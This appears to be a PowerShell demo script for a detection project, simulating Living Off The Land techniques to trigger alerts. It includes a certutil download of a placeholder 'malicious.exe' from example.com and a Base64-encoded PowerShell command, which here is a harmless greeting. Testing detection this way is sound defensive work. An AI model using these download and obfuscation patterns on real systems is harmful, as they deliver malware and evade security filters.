# LOTIflow - Attack Simulation Script (FOR DEMO ONLY)
# This script simulates common Living Off The Land (LOTL) techniques 
# to demonstrate the detection capabilities of the project.

Write-Host "==========================================" -ForegroundColor Red
Write-Host "    LOTL Attack Simulation Started" -ForegroundColor Red
Write-Host "==========================================" -ForegroundColor Red

try {
    # 1. Simulate CertUtil Abuse (Rule: CertUtil Download)
    Write-Host "`n[METHOD 1] CertUtil Abuse (LOLBAS)" -ForegroundColor Cyan -NoNewline
    Write-Host " - Using 'certutil.exe' to download files." -ForegroundColor White
    Write-Host "Explanation: Attackers use trusted system tools like CertUtil to bypass security filters." -ForegroundColor Gray
    
    $dummyUrl = "http://example.com/malicious.exe"
    $dummyPath = "$env:TEMP\demo_malware.txt"
    Write-Host "Running: certutil.exe -urlcache -split -f $dummyUrl $dummyPath" -ForegroundColor DarkGray
    certutil.exe -urlcache -split -f $dummyUrl $dummyPath
    Write-Host "✅ Command executed." -ForegroundColor Green

    # 2. Simulate Encoded PowerShell (Rule: Suspicious PowerShell)
    Write-Host "`n[METHOD 2] PowerShell Obfuscation" -ForegroundColor Cyan -NoNewline
    Write-Host " - Using '-EncodedCommand' to hide script logic." -ForegroundColor White
    Write-Host "Explanation: Encoding commands in Base64 is a common way to evade simple keyword-based detection." -ForegroundColor Gray

    $encodedCommand = "V3JpdGUtSG9zdCAiSGVsbG8gZnJvbSBMT1RJZmxvdyBEZW1vISIgLUZvcmVncm91bmRDb2xvciBHcmVlbg=="
    Write-Host "Running: powershell.exe -EncodedCommand $encodedCommand" -ForegroundColor DarkGray
    powershell.exe -EncodedCommand $encodedCommand
    Write-Host "✅ Command executed." -ForegroundColor Green

    Write-Host "`nAll simulations completed successfully!" -ForegroundColor Green
    Write-Host "Check the LOTIflow Dashboard for new alerts." -ForegroundColor Yellow
}
finally {
    Write-Host "`n==========================================" -ForegroundColor Red
    Write-Host "Simulation Done. Press any key to exit..." -ForegroundColor Red
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
}
